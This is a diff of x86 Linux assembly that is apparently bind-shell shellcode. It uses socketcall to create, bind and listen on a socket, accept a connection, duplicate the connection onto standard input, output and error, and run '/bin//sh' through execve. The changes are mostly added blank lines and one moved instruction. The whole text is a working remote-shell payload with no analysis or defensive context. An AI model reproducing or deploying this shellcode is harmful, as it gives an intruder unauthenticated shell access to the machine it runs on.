@@ -19,6 +19,7 @@ _start:
 	push 0x2
 	mov ecx,esp
 	int 0x80
+
 	mov esi,eax
 	mov al,0x66
 	mov bl,0x2
@@ -31,12 +32,14 @@ _start:
 	push esi 
 	mov ecx,esp
 	int 0x80
+
 	mov al,0x66
 	mov bl,0x4
 	push 0x1
 	push esi 
 	mov ecx,esp
 	int 0x80
+
 	mov al,0x66
 	mov bl,0x5
 	push edx 
@@ -44,6 +47,7 @@ _start:
 	push esi 
 	mov ecx,esp
 	int 0x80
+
 	mov ebx,eax
 	xor ecx,ecx
 	mov cl,0x3
@@ -53,16 +57,24 @@ dupfd:
 	dec cl
 	mov al,0x3f
 	int 0x80
+
 	jne dupfd
+	
 	xor eax,eax
+	
+	mov al,0xb
+	
 	push edx 
 	push 0x68732f6e
 	push 0x69622f2f
 	mov ebx,esp
+
 	push edx 
 	push ebx 
 	mov ecx,esp
+
 	push edx 
 	mov edx,esp
-	mov al,0xb
+
+
 	int 0x80
